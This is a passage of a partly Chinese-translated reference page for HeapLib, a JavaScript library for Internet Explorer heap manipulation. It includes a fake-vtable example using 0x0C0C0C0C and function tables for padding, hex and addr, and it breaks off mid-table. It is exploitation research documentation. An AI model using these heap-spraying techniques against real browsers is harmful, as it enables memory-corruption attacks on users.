<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Utility
functions<o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
library also provides functions for manipulating data used in exploitation.
Here's an example of using the addr() and padding() functions to prepare a fake
vtable block:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>HeapLib.js</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中还提供了一些用来操作</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploitation</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>要用的数据的函数。下面是用</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>addr()</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>和</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>padding()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数准备一个假冒的虚函数表块的代码。</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>var vtable = &quot;&quot;;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>for (var i = 0; i &lt; 100; i++) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Add 100 copies of the address 0x<st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv> to the vtable<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>vtable = vtable + heap.addr(0x<st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="0" UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="0" UnitName="C" w:st="on">0C</st1:chmetcnv>);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// Pad the vtable with &quot;A&quot; characters to make the block size exactly 1008 bytes<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>vtable = vtable + heap.padding((1008 - (vtable.length*2+6))/2);<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>For
more details, see the description of the functions in the next section.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>更进一步关于的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>HeapLib</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的信息，详见下一节。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>HeapLib
reference</span><span style='font-size:12.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana'>（这一段，你应该去看</span><span lang=EN-US
style='font-size:12.5pt;font-family:Verdana'>HeapLib</span><span
style='font-size:12.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的源代码，不译）</span><span lang=EN-US style='font-size:12.5pt;font-family:
Verdana'><o:p></o:p></span></h2>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Object-oriented
interface<o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
HeapLib API is implemented as an object-oriented interface. To use the API in
Internet Explorer, create an instance of the <i>heapLib.ie</i> class.<o:p></o:p></span></p>

<table class=MsoNormalTable border=1 cellspacing=0 cellpadding=0 width=880
 style='width:660.0pt;background:#F9F9F9;border-collapse:collapse;border:none;
 mso-border-alt:solid #AAAAAA .75pt'>
 <tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes'>
  <td width=264 style='width:198.0pt;border:solid #AAAAAA 1.0pt;mso-border-alt:
  solid #AAAAAA .75pt;background:#F2F2F2;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Constructor<o:p></o:p></span></b></p>
  </td>
  <td style='border:solid #AAAAAA 1.0pt;border-left:none;mso-border-left-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;background:#F2F2F2;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Description<o:p></o:p></span></b></p>
  </td>
 </tr>
 <tr style='mso-yfti-irow:1;mso-yfti-lastrow:yes'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>heapLib.ie(maxAlloc, heapBase)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Creates a new heapLib API object for Internet Explorer.
  The <i>maxAlloc</i> argument sets the maximum block size that can be
  allocated using the alloc() function. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l2 level1 lfo1;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>maxAlloc - maximum allocation size in
  bytes (defaults to 65535) <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l2 level1 lfo1;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>heapBase - base of the default process
  heap (defaults to 0x150000) <o:p></o:p></span></p>
  </div>
  </td>
 </tr>
</table>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>All
functions described below are instance methods of the <i>heapLib.ie</i> class.<o:p></o:p></span></p>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Debugging<o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>To
see the debugging output, attach WinDbg to the IEXPLORE.EXE process and set the
breakpoints described <a
href="http://www.determina.com/security.research/presentations/bh-eu07/bh-eu07-sotirov-paper.html#breakpoints">above</a>.
If the debugger is not present, the functions below have no effect.<o:p></o:p></span></p>

<table class=MsoNormalTable border=1 cellspacing=0 cellpadding=0 width=880
 style='width:660.0pt;background:#F9F9F9;border-collapse:collapse;border:none;
 mso-border-alt:solid #AAAAAA .75pt'>
 <tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes'>
  <td width=264 style='width:198.0pt;border:solid #AAAAAA 1.0pt;mso-border-alt:
  solid #AAAAAA .75pt;background:#F2F2F2;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Function<o:p></o:p></span></b></p>
  </td>
  <td style='border:solid #AAAAAA 1.0pt;border-left:none;mso-border-left-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;background:#F2F2F2;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Description<o:p></o:p></span></b></p>
  </td>
 </tr>
 <tr style='mso-yfti-irow:1'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>debug(msg)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Outputs a debugging message in WinDbg. The <i>msg</i>
  argument must be a string literal. Using string concatenation to build the
  message will result in heap allocations. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l11 level1 lfo2;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>msg - string to output <o:p></o:p></span></p>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:2'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>debugHeap(enable)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Enables or disables logging of heap operations in WinDbg. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l16 level1 lfo3;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>enable - a boolean value, set to <i>true</i>
  to enable heap logging <o:p></o:p></span></p>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:3;mso-yfti-lastrow:yes'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>debugBreak()<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Triggers a breakpoint in the debugger.<o:p></o:p></span></p>
  </td>
 </tr>
</table>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Utility
functions<o:p></o:p></span></h3>

<table class=MsoNormalTable border=1 cellspacing=0 cellpadding=0 width=880
 style='width:660.0pt;background:#F9F9F9;border-collapse:collapse;border:none;
 mso-border-alt:solid #AAAAAA .75pt'>
 <tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes'>
  <td width=264 style='width:198.0pt;border:solid #AAAAAA 1.0pt;mso-border-alt:
  solid #AAAAAA .75pt;background:#F2F2F2;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Function<o:p></o:p></span></b></p>
  </td>
  <td style='border:solid #AAAAAA 1.0pt;border-left:none;mso-border-left-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;background:#F2F2F2;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal align=center style='margin-top:12.0pt;margin-right:0cm;
  margin-bottom:12.0pt;margin-left:0cm;text-align:center'><b><span lang=EN-US
  style='font-size:9.5pt;font-family:Verdana;color:#404040'>Description<o:p></o:p></span></b></p>
  </td>
 </tr>
 <tr style='mso-yfti-irow:1'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>padding(len)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Returns a string of a specified length, up to the
  maximum allocation size set in the <i>heapLib.ie</i> constructor. The string
  contains &quot;A&quot; characters. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal style='margin-top:12.0pt;margin-right:0cm;margin-bottom:
  12.0pt;margin-left:0cm'><span lang=EN-US style='font-size:9.5pt;font-family:
  Verdana;color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l3 level1 lfo4;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>len - length in characters <o:p></o:p></span></p>
  </div>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.padding(5)<span
  style='mso-spacerun:yes'>            </span>// returns &quot;AAAAA&quot;<o:p></o:p></span></p>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:2'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>round(num, round)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Returns an integer rounded up to a specified value. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l0 level1 lfo5;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>num - integer to round <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l0 level1 lfo5;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>round - value to round to <o:p></o:p></span></p>
  </div>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.round(210,
  16)<span style='mso-spacerun:yes'>        </span>// returns 224<o:p></o:p></span></p>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:3'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>hex(num, width)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Converts an integer to a hex string. This function uses the
  heap. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l7 level1 lfo6;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>num - integer to convert <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l7 level1 lfo6;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  </span></span></span><![endif]><span lang=EN-US style='font-size:9.5pt;
  font-family:Verdana;color:#404040'>width - pad the output with zeroes to a
  specified width (optional) <o:p></o:p></span></p>
  </div>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Example: <o:p></o:p></span></p>
  <p class=MsoNormal style='margin-top:9.6pt;margin-right:0cm;margin-bottom:
  9.6pt;margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
  lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>heap.hex(210,
  8)<span style='mso-spacerun:yes'>           </span>// returns
  &quot;000000D2&quot;<o:p></o:p></span></p>
  </div>
  </td>
 </tr>
 <tr style='mso-yfti-irow:4;mso-yfti-lastrow:yes'>
  <td valign=top style='border:solid #AAAAAA 1.0pt;border-top:none;mso-border-top-alt:
  solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>addr(addr)<o:p></o:p></span></p>
  </td>
  <td valign=top style='border-top:none;border-left:none;border-bottom:solid #AAAAAA 1.0pt;
  border-right:solid #AAAAAA 1.0pt;mso-border-top-alt:solid #AAAAAA .75pt;
  mso-border-left-alt:solid #AAAAAA .75pt;mso-border-alt:solid #AAAAAA .75pt;
  padding:2.4pt 2.4pt 2.4pt 2.4pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Converts a 32-bit address to a 4-byte string with the same
  representation in memory. This function uses the heap. <o:p></o:p></span></p>
  <div style='margin-top:9.6pt'>
  <p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
  color:#404040'>Arguments: <o:p></o:p></span></p>
  <p class=MsoNormal style='mso-margin-top-alt:auto;mso-margin-bottom-alt:auto;
  margin-left:24.0pt;text-indent:-18.0pt;mso-list:l13 level1 lfo7;tab-stops:
  list 36.0pt'><![if !supportLists]><span lang=EN-US style='font-size:10.0pt;
  mso-bidi-font-size:9.5pt;font-family:Symbol;mso-fareast-font-family:Symbol;
  mso-bidi-font-family:Symbol;color:#404040'><span style='mso-list:Ignore'>·<span
  style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
